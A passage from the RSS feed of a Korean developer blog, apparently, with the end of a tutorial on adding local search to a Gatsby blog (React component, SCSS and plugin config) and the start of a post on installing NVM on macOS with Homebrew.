+&lt;h3 id=&quot;3-컴포넌트-추가&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#3-%EC%BB%B4%ED%8F%AC%EB%84%8C%ED%8A%B8-%EC%B6%94%EA%B0%80&quot; aria-label=&quot;3 컴포넌트 추가 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;3. 컴포넌트 추가&lt;/h3&gt;
+&lt;p&gt;src 밑에 component 디렉토리에 &lt;strong&gt;search&lt;/strong&gt; 디렉토리를 새로 만들고,&lt;br&gt;
+&lt;strong&gt;index.jsx&lt;/strong&gt; &lt;strong&gt;index.scss&lt;/strong&gt; 두 파일을 만들어준다.&lt;/p&gt;
+&lt;p&gt;그리고 아래와 같이 추가한다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;javascript&quot;&gt;&lt;pre class=&quot;language-javascript&quot;&gt;&lt;code class=&quot;language-javascript&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//src/component/search/index.jsx&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; React &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;react&apos;&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;./index.scss&apos;&lt;/span&gt;
+
+&lt;span class=&quot;token keyword&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;Search&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; searchQuery&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; setSearchQuery &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;form action&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;/&quot;&lt;/span&gt; method&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;get&quot;&lt;/span&gt; autoComplete&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;off&quot;&lt;/span&gt; className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;search-form&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+      &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;label htmlFor&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;header-search&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+        &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;span className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;visually-hidden&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;Search blog posts&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;span&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+      &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;label&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+      &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;input
+        value&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;searchQuery&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+        onChange&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setSearchQuery&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;target&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+        type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;text&quot;&lt;/span&gt;
+        id&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;header-search&quot;&lt;/span&gt;
+        className&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;search-form__input&quot;&lt;/span&gt;
+        placeholder&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Serch keyword&quot;&lt;/span&gt;
+        name&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;s&quot;&lt;/span&gt;
+      &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+    &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt;form&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;scss&quot;&gt;&lt;pre class=&quot;language-scss&quot;&gt;&lt;code class=&quot;language-scss&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;//src/component/search/index.scss&lt;/span&gt;
+
+&lt;span class=&quot;token selector&quot;&gt;.search-form &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 100%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; flex&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token property&quot;&gt;justify-content&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; center&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token selector&quot;&gt;.visually-hidden &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;clip&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;rect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0 0 0 0&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;clip-path&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;inset&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;50%&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 1px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; hidden&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; absolute&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;white-space&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; nowrap&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 1px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;token selector&quot;&gt;.search-form__input &lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; Source Sans Pro&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Roboto&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Open Sans&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Liberation Sans&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DejaVu
+        Sans&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Verdana&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Helvetica&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; Arial&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; sans-serif&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;outline&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;margin&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 1px solid #d9d9d9&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;box-sizing&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; border-box&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #333&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;display&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; block&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 14px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 40px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;line-height&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 40px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;padding&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 0 15px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 350px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 90%&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;border-radius&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; 25px&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; #f5f5f5&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;token property&quot;&gt;box-shadow&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt; inset 4px 4px 4px #d0d0d0&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
+&lt;h3 id=&quot;4-gatsby-configjs-파일-수정&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#4-gatsby-configjs-%ED%8C%8C%EC%9D%BC-%EC%88%98%EC%A0%95&quot; aria-label=&quot;4 gatsby configjs 파일 수정 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;4. gatsby-config.js 파일 수정&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;gatsby-config.js&lt;/strong&gt; 파일의 일부 수정하면 끝이다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    ...
+    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+      resolve&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &apos;gatsby-plugin-local-search&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+      options&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+        name&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &apos;pages&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        engine&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &apos;flexsearch&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        query&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; `
+              query &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+                allMarkdownRemark(sort&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; fields&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;frontmatter___date&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; order&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; DESC &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;) &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+                  nodes &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+                    excerpt
+                    fields &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+                      slug
+                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+                    frontmatter &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+                      date(formatString&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;MMMM DD, YYYY&quot;&lt;/span&gt;)
+                      title&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+                      category
+                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+                  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+              &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+            `&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        ref&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &apos;slug&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        index&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&apos;title&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;excerpt&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;category&apos;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        store&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&apos;title&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;excerpt&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;slug&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;date&apos;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &apos;category&apos;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+        normalizer&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; (&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; data &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;) =&gt;
+          data.allMarkdownRemark.nodes.map(node =&gt; (&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+            title&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; node.frontmatter.title&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+            excerpt&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; node.excerpt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+            slug&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; node.fields.slug&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+            date&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; node.frontmatter.date&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+            category&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; node.frontmatter.category&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+          &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;))&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    `gatsby-transformer-sharp`&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    ...
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;br&gt;
+&lt;p&gt;이렇게 하고 구동하면 내 블로그 처럼 검색 기능이 달릴거다.&lt;br&gt;
+나처럼 바쁜데 컨텐츠는 올려야 하고, 직접 구현은 시간이 없어서 대충 쓰고 싶은 사람들에겐 최고의 결과물 조합이 아닐까 싶다.&lt;/p&gt;
+&lt;p&gt;이렇게 했는데도 잘 모르겠고, 답답한 분들은 댓글 또는 이 &lt;a href=&quot;https://github.com/kostyrko/kontrolqa&quot;&gt;깃허브(kostyrko)&lt;/a&gt; 를 참고하자.&lt;br&gt;
+이 형님이 아까 이슈에서 참고했던 깃허브이다.&lt;br&gt;
+이거 보고도 적용이 안된다면…=.=;;;&lt;/p&gt;
+&lt;p&gt;그냥 다른 블로그 테마를 찾아보는 것이 정신적으로 편안할 듯 싶다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;PS : 시간이 부족하다…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[NVM으로 NodeJs 버전 변경 관리하기]]></title><description><![CDATA[thumbnail NVM (Node Version Manager) 이번에 Hexo 에서 Gatsby 블로그로 옮겨오면서 이것저것 셋팅하느라 바빴다. 그 중 이 블로그는 Gatsby-Starter-bee…]]></description><link>https://elfinlas.github.io/node-js/221027_install-nvm/</link><guid isPermaLink="false">https://elfinlas.github.io/node-js/221027_install-nvm/</guid><pubDate>Thu, 27 Oct 2022 16:10:44 GMT</pubDate><content:encoded>&lt;p&gt;&lt;img src=&quot;../../assets/thumbnail/DSC08472.png&quot; alt=&quot;thumbnail&quot;&gt;&lt;/p&gt;
+&lt;h1 id=&quot;nvm-node-version-manager&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#nvm-node-version-manager&quot; aria-label=&quot;nvm node version manager permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;NVM (Node Version Manager)&lt;/h1&gt;
+&lt;p&gt;이번에 &lt;strong&gt;Hexo&lt;/strong&gt; 에서 &lt;strong&gt;Gatsby&lt;/strong&gt; 블로그로 옮겨오면서 이것저것 셋팅하느라 바빴다.&lt;br&gt;
+그 중 이 블로그는 &lt;a href=&quot;https://github.com/JaeYeopHan/gatsby-starter-bee&quot;&gt;Gatsby-Starter-bee&lt;/a&gt; 라는 테마로 구성되어 있다.&lt;/p&gt;
+&lt;p&gt;근데 이 블로그 탬플릿은 노드 상위 버전을 지원하지 않는다.&lt;br&gt;
+허나… 지금 하는 프로젝트는 18버전대 이상을 사용한다.
+그래서 Node 버전을 관리하며 사용해야 했다.&lt;/p&gt;
+&lt;p&gt;파이썬에는 &lt;strong&gt;PyEnv&lt;/strong&gt;인가 하는 것이 있는데 역시 노드 진영에도 비슷한 것을 하는게 있었다.&lt;br&gt;
+오늘 포스팅할 &lt;strong&gt;NVM&lt;/strong&gt;이라는 것인데 대충 설명하면…&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;프로젝트마다 버전 관리하기.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;라고 할 수 있다.&lt;/p&gt;
+&lt;br&gt;
+&lt;p&gt;먼저 nvm을 설치한다.&lt;br&gt;
+윈도우나 기타 리눅스는 다른 블로그를 참고해주시고…&lt;br&gt;
+이곳에서는 &lt;strong&gt;MacOS&lt;/strong&gt; 기준으로 설명한다.&lt;/p&gt;
+&lt;p&gt;뭐 설명이고 자시고 할 것 없이 &lt;strong&gt;brew&lt;/strong&gt; 하나 있으면 끝이다.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;brew install nvm&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;설치 후 NVM 설정을 해줘야 하는데 터미널 쉘을 수정해야 한다.&lt;br&gt;
+나의 경우 zsh를 사용하는데 home 디렉토리의 &lt;strong&gt;.zshrc&lt;/strong&gt;라는 파일을 열어서 수정한다.&lt;br&gt;
+VSCode로 수정해도 되고 vim으로 수정해도 되고 편한 방법으로…&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;#파일 맨 마지막에 추가해준다.
+export NVM_DIR=~/.nvm
+source $(brew --prefix nvm)/nvm.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;위와 같이 처리했다면 터미널을 종료 후 재시작 하고 잘 되었는지 아래 명령어를 통해 확인한다.&lt;/p&gt;
+&lt;p&gt;&lt;span
+      class=&quot;gatsby-resp-image-wrapper&quot;
+      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 277px; &quot;
+    &gt;
+      &lt;span
+    class=&quot;gatsby-resp-image-background-image&quot;
+    style=&quot;padding-bottom: 28.51985559566787%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZklEQVQY022RzW7aQBSFvc2iUqVUiggpwcb2gDGY8c8UQ4GAwTVRpKSqKiCJIlhlValSN910lwfpE+Q9InXTN+ibfJ1YVVtFWXy6mzPnnjPXsNwebjPE1rNu+TTsAEdIHDdAdAd00gJPjhEixLVDPSOtj7C0ruHIEtuVNL0E0Yox9g0D9UZRFDlKxbT9LvXDPZwDgxedCasHOL//RZAtSbanyPmMQbpgfbnjw8dr1pstefH+r6kR9RKy+ZLJNKfbU3qLpFazqR5UOG4lDG7viFafER2Fnw512j5eW6H6s5J0OEdGozJ1afhueUGhGU1yjs02tuPTFJpkQXy2pSUnBF5I0BviOLpyMy6r2W74B/09IvpXeTx+y3R2QpZN8XTdRnUP85XBy3DB5gdk33/y6cs3NpsdNdOnpdM9Pn7Ko1mZ0LQ8fQgt9CRWo83Ra4dKpY5QC/o3X+nmV/R1tVid6CThs2b/8xu2eMNITGO6VgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+  &gt;&lt;/span&gt;
+  &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
